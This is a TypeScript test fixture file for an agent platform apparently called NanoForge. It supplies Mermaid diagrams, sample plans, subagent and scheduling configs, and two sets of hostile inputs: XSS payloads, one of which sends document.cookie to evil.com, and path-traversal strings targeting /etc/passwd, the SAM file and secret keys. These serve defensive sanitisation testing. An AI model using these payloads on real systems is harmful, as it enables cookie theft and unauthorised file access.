/**
 * NanoForge E2E Test Fixtures & Vectors.
 */
import type { ExecutionPlan } from "@protocol/plan";
import type { InvokeSubagentParams, DefineSubagentParams } from "@protocol/subagents";
import type { ScheduleParams, ManageTaskParams } from "@protocol/tasks";
import type { MemorySetParams } from "@protocol/memory";

export const MERMAID_VALID_FIXTURES = {
  flowchart: `graph TD
    A[Client] -->|WebSocket| B(Agent Host)
    B --> C{Policy Gate}
    C -->|Approved| D[PTY Execution]
    C -->|Denied| E[Reject]`,
  sequence: `sequenceDiagram
    autonumber
    User->>Client: Type /plan build
    Client->>Host: plan.submit
    Host-->>Client: run.state(queued)`,
  classDiagram: `classDiagram
    class AgentSupervisor {
      +spawnSubagent()
      +manageSubagents()
    }
    class DaemonManager {
      +manageTask()
      +scheduleTask()
    }`,
};

export const MERMAID_MALICIOUS_FIXTURES = {
  scriptTag: `graph TD
    A["<script>alert('xss')</script>"] --> B[Server]`,
  svgOnload: `graph TD
    A["<svg onload='window.__pwned=true'>"] --> B[Target]`,
  imgError: `graph TD
    A["<img src='x' onerror='fetch(\\"http://evil.com/leak?\\"+document.cookie)'>"] --> B[Server]`,
  javascriptUri: `graph TD
    A["<a href='javascript:alert(1)'>Click Me</a>"] --> B[Node]`,
  foreignObject: `graph TD
    A["<foreignObject><body xmlns='http://www.w3.org/1999/xhtml'><iframe src='javascript:alert(1)'></iframe></body></foreignObject>"] --> B[End]`,
  nestedPolyglot: `graph TD
    A["'><svg/onload=confirm(1)>"] --> B["<iframe src=data:text/html,<script>alert(1)</script>>"]`,
};

export const PATH_TRAVERSAL_VECTORS = [
  "../secret.txt",
  "..\\..\\windows\\system32\\config\\sam",
  "%2e%2e%2fpackage.json",
  "%252e%252e%252fsecret.key",
  "....//....//etc/passwd",
  "/etc/passwd",
  "C:\\Windows\\win.ini",
  "subfolder/../../../../escape.txt",
  ".agents/../secret.txt",
  ".agents/peer_agent_1/handoff.md",
  "test.txt::$DATA",
];

export const VALID_EXECUTION_PLANS: Record<string, ExecutionPlan> = {
  simpleDiscovery: {
    id: "plan-discovery-1",
    goal: "Inspect repository workspace structure",
    steps: [
      {
        id: "step-1",
        title: "Discover files",
        tool: "terminal.exec",
        parameters: { executable: "node", args: ["--version"] },
        requiresApproval: false,
      },
    ],
  },
  multiStepWithApproval: {
    id: "plan-mutate-1",
    goal: "Compile and apply build updates",
    steps: [
      {
        id: "step-read",
        title: "Read environment",
        tool: "terminal.exec",
        parameters: { executable: "node", args: ["--version"] },
        requiresApproval: false,
      },
      {
        id: "step-write",
        title: "Apply changes",
        tool: "terminal.exec",
        parameters: { executable: "npm", args: ["--version"] },
        dependsOn: ["step-read"],
        requiresApproval: true,
      },
    ],
  },
};

export const SAMPLE_SUBAGENTS: Record<string, InvokeSubagentParams> = {
  explorerInherit: {
    name: "test_explorer",
    archetype: "explorer",
    task: "Survey repository file tree",
    isolationMode: "inherit",
  },
  implementerBranch: {
    name: "test_implementer",
    archetype: "implementer",
    task: "Refactor storage module on branch",
    isolationMode: "branch",
  },
  specialistShare: {
    name: "test_specialist",
    archetype: "specialist",
    task: "Verify security invariants in scratch space",
    isolationMode: "share",
  },
};

export const SAMPLE_SCHEDULES: Record<string, ScheduleParams> = {
  oneShotTimer: {
    durationSeconds: 2,
    prompt: "Wakeup and check build artifacts",
    timerCondition: "never",
  },
  recurringCron: {
    cronExpression: "*/5 * * * *",
    prompt: "Perform periodic telemetry sweep",
    isDaemon: true,
    maxIterations: 3,
  },
};

export const SAMPLE_MEMORY_ENTRIES: Record<string, MemorySetParams> = {
  globalConfig: {
    key: "cluster.ready",
    value: { status: "operational", nodes: 4 },
    namespace: "global",
    tags: ["system", "status"],
  },
  agentHandoff: {
    key: "handoff.explorer",
    value: {
      observation: "Clean workspace tree",
      logicChain: "All paths valid",
      caveats: "None",
      conclusion: "Ready for testing",
      verificationMethod: "npm test",
    },
    namespace: "handoffs",
    tags: ["e2e", "handoff"],
  },
};
